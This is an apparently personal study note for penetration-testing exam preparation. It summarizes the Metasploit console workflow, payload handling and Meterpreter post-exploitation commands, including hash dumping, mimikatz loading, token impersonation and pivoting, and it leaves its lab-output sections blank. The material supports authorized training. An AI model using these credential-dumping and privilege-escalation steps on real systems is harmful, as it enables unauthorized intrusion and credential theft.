# Using the Metasploit Framework

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Use MSF to find, configure and run modules (exploits/auxiliary/post), catch Meterpreter sessions, and do post-exploitation. A framework to speed up known-exploit work, not a replacement for understanding the attack.

## msfconsole workflow
```text
search <name|cve:XXXX|type:exploit platform:windows>   # find a module
use <module|number>                                     # select it
info                                                    # read what it does
show options ; show targets ; show advanced             # configure
set RHOSTS <ip> ; set LHOST <ip> ; set LPORT <p>
set payload <payload> ; set target <n>
setg <opt> <val>                                        # set globally (persists across modules)
check                                                   # is the target vulnerable (if supported)
exploit            # run   (exploit -j = background job, exploit -z = don't interact)
```

## Payloads & sessions
```text
show payloads                    # staged vs stageless (meterpreter/reverse_tcp etc.)
sessions -l                      # list   |  sessions -i <id> interact  |  sessions -K kill all
sessions -u <id>                 # upgrade a basic shell → Meterpreter
```
Use `multi/handler` to catch a session from a standalone msfvenom payload.

## Meterpreter (post-exploitation)
```text
sysinfo ; getuid ; getprivs      # situational awareness
ps ; migrate <pid>               # move into a stable/privileged process
getsystem                        # try auto-privesc to SYSTEM
hashdump                         # dump local hashes
load kiwi / use incognito        # mimikatz / token impersonation (impersonate_token, steal_token)
shell ; execute -f <cmd> -i      # drop to a native shell
upload <f> / download <f>        # file transfer
run post/multi/recon/local_exploit_suggester    # find privesc exploits
portfwd / route add              # pivoting through the session
background                       # keep session, return to msfconsole
```

## Database & automation
```text
db_status ; workspace            # (postgres-backed) organize engagements
db_nmap <args>                   # nmap results straight into the DB (hosts/services)
```

## Notes for the exam / real work
- CPTS/OSCP **limit Metasploit use** — know how to do the key attacks manually too; MSF is a time-saver, not a crutch.
- `check` before `exploit` when possible; some exploits are unstable and can crash the target.
- Meterpreter is noisy (EDR catches it); native shells / manual techniques are quieter.

> Core loop: `search → use → show options → set RHOSTS/LHOST → check → exploit → sessions`. Once you have Meterpreter: `sysinfo`, `getuid`, `migrate`, then `local_exploit_suggester` or `getsystem` for privesc.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
